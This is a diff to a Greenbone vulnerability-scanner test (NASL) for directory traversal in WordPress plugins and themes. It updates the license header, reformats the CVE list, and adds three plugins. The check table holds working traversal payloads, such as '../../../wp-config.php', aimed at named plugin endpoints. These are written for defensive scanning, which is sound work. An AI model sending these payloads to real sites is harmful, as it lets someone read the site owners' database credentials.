@@ -1,49 +1,70 @@
-# Copyright (C) 2020 Greenbone Networks GmbH
+# SPDX-FileCopyrightText: 2020 Greenbone AG
 # Some text descriptions might be excerpted from (a) referenced
 # source(s), and are Copyright (C) by the respective right holder(s).
 #
-# SPDX-License-Identifier: GPL-2.0-or-later
-#
-# This program is free software; you can redistribute it and/or
-# modify it under the terms of the GNU General Public License
-# as published by the Free Software Foundation; either version 2
-# of the License, or (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program; if not, write to the Free Software
-# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+# SPDX-License-Identifier: GPL-2.0-only
 
 CPE = "cpe:/a:wordpress:wordpress";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.117055");
-  script_version("2023-10-20T16:09:12+0000");
+  script_version("2024-09-12T07:59:53+0000");
   script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
   script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
-  script_cve_id("CVE-2007-6369", "CVE-2012-0896", "CVE-2013-7240", "CVE-2014-4940", "CVE-2014-5368",
-                "CVE-2014-8799", "CVE-2014-9119", "CVE-2014-9734", "CVE-2015-1000005", "CVE-2015-1000006",
-                "CVE-2015-1000007", "CVE-2015-1000010", "CVE-2015-1000012", "CVE-2015-1579", "CVE-2015-4414",
-                "CVE-2015-4694", "CVE-2015-4703", "CVE-2015-4704", "CVE-2015-5468", "CVE-2015-5469",
-                "CVE-2015-5471", "CVE-2015-5472", "CVE-2015-5609", "CVE-2015-9406", "CVE-2015-9470",
-                "CVE-2015-9480", "CVE-2016-10924", "CVE-2016-10956", "CVE-2017-1002008", "CVE-2018-16283",
-                "CVE-2018-16299", "CVE-2018-7422", "CVE-2018-9118", "CVE-2019-14205", "CVE-2019-14206",
-                "CVE-2019-9618", "CVE-2020-11738", "CVE-2021-39316", "CVE-2022-1119");
+  # nb: Unlike other VTs we're using the CVEs line by line here for easier addition of new CVEs
+  script_cve_id("CVE-2007-6369",
+                "CVE-2012-0896",
+                "CVE-2013-7240",
+                "CVE-2014-4577",
+                "CVE-2014-4940",
+                "CVE-2014-4941",
+                "CVE-2014-5187",
+                "CVE-2014-5368",
+                "CVE-2014-8799",
+                "CVE-2014-9119",
+                "CVE-2014-9734",
+                "CVE-2015-1000005",
+                "CVE-2015-1000006",
+                "CVE-2015-1000007",
+                "CVE-2015-1000010",
+                "CVE-2015-1000012",
+                "CVE-2015-1579",
+                "CVE-2015-4414",
+                "CVE-2015-4694",
+                "CVE-2015-4703",
+                "CVE-2015-4704",
+                "CVE-2015-5468",
+                "CVE-2015-5469",
+                "CVE-2015-5471",
+                "CVE-2015-5472",
+                "CVE-2015-5609",
+                "CVE-2015-9406",
+                "CVE-2015-9470",
+                "CVE-2015-9480",
+                "CVE-2016-10924",
+                "CVE-2016-10956",
+                "CVE-2017-1002008",
+                "CVE-2018-16283",
+                "CVE-2018-16299",
+                "CVE-2018-7422",
+                "CVE-2018-9118",
+                "CVE-2019-14205",
+                "CVE-2019-14206",
+                "CVE-2019-9618",
+                "CVE-2020-11738",
+                "CVE-2021-39316",
+                "CVE-2022-1119");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-  script_tag(name:"last_modification", value:"2023-10-20 16:09:12 +0000 (Fri, 20 Oct 2023)");
+  script_tag(name:"last_modification", value:"2024-09-12 07:59:53 +0000 (Thu, 12 Sep 2024)");
   script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
   script_tag(name:"severity_origin", value:"NVD");
   script_tag(name:"severity_date", value:"2020-08-24 17:37:00 +0000 (Mon, 24 Aug 2020)");
   script_tag(name:"creation_date", value:"2020-11-20 08:15:18 +0000 (Fri, 20 Nov 2020)");
   script_name("WordPress Multiple Plugins / Themes Directory Traversal / File Download Vulnerability (HTTP)");
   script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
+  script_copyright("Copyright (C) 2020 Greenbone AG");
   script_family("Web application abuses");
   script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
@@ -202,7 +223,13 @@ if(description)
 
   - simple-file-list
 
-  - Javo Spot Premium Theme");
+  - Javo Spot Premium Theme
+
+  - CVE-2014-4577: WP AmASIN
+
+  - CVE-2014-4941: Cross-RSS (wp-cross-rss)
+
+  - CVE-2014-5187: Tom M8te (tom-m8te)");
 
   script_tag(name:"solution", value:"Please contact the vendor for additional information regarding
   potential updates. If none exist, remove the plugin / theme.");
@@ -291,6 +318,9 @@ checks["/wp-content/themes/oxygen-theme/download.php?file="] = "../../../wp-conf
 checks["/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="] = "../../../wp-config.php";
 checks["/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile="] = "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php";
 checks["/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn="] = "../../wp-config.php&callback=jQuery";
+checks["/wp-content/plugins/wp-amasin-the-amazon-affiliate-shop/reviews.php?url="] = "../../../wp-config.php"; # CVE-2014-4577
+checks["/wp-content/plugins/cross-rss/proxy.php?rss="] = "../../../wp-config.php"; # CVE-2014-4941
+checks["/wp-content/plugins/tom-m8te/tom-download-file.php?file="] = "../../../wp-config.php"; # CVE-2014-5187
 
 report = 'The following URLs are vulnerable:\n';
 
